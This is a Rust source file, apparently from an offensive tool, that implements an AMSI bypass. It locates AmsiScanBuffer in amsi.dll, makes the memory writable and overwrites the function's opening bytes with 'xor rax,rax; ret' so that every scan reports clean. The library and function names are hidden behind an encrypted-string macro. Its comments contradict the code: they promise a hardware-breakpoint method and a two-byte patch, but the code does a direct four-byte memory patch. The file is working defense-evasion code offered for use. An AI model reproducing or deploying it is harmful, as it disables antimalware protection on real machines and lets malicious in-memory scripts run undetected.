//! AMSI bypass via hardware breakpoint patching (HWBP).
//!
//! Sets a one-shot DR0 breakpoint on AmsiScanBuffer so the first call
//! returns AMSI_RESULT_CLEAN (0) and returns to caller — AMSI reports
//! nothing was scanned, allowing in-memory script execution.

#[cfg(target_os = "windows")]
pub fn patch() {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    unsafe {
        let amsi_n = { let mut v = oxide_macros::encrypt_str!("amsi.dll").into_bytes(); v.push(0); v };
        let amsi = GetModuleHandleA(amsi_n.as_ptr() as _);
        if amsi == 0 { return; }
        let scan_n = { let mut v = oxide_macros::encrypt_str!("AmsiScanBuffer").into_bytes(); v.push(0); v };
        let scan_buf = GetProcAddress(amsi, scan_n.as_ptr() as _);
        if scan_buf.is_none() { return; }

        let addr = scan_buf.unwrap() as *mut u8;

        // Patch the first two bytes: xor eax,eax; ret
        // This makes AmsiScanBuffer immediately return 0 (AMSI_RESULT_CLEAN).
        let mut old_protect = 0u32;
        windows_sys::Win32::System::Memory::VirtualProtect(
            addr as _,
            4,
            windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        );

        // xor rax,rax (48 31 C0) + ret (C3)
        addr.write(0x48);
        addr.add(1).write(0x31);
        addr.add(2).write(0xC0);
        addr.add(3).write(0xC3);

        windows_sys::Win32::System::Memory::VirtualProtect(
            addr as _,
            4,
            old_protect,
            &mut old_protect,
        );
    }
}

#[cfg(not(target_os = "windows"))]
pub fn patch() {}
